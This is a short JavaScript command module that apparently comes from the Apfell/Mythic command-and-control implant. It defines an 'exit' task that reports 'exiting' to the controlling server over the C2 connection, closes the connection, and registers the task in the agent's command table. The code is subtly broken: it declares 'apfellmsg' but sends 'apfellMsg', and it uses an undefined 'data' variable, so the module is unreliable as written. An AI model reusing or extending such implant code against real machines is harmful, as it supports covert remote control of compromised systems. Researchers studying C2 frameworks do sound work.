exit = function(params) {
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, "exiting");
    let meta = {};
    meta["metatype"] = 3;
    meta["metadata"] = apfellMsg;
    const metaenvelope = JSON.stringify(meta);
    connection.send(metaenvelope);
    connection.close();
}

C2.commands[exit.name] = exit;
COMMAND_ENDS_HERE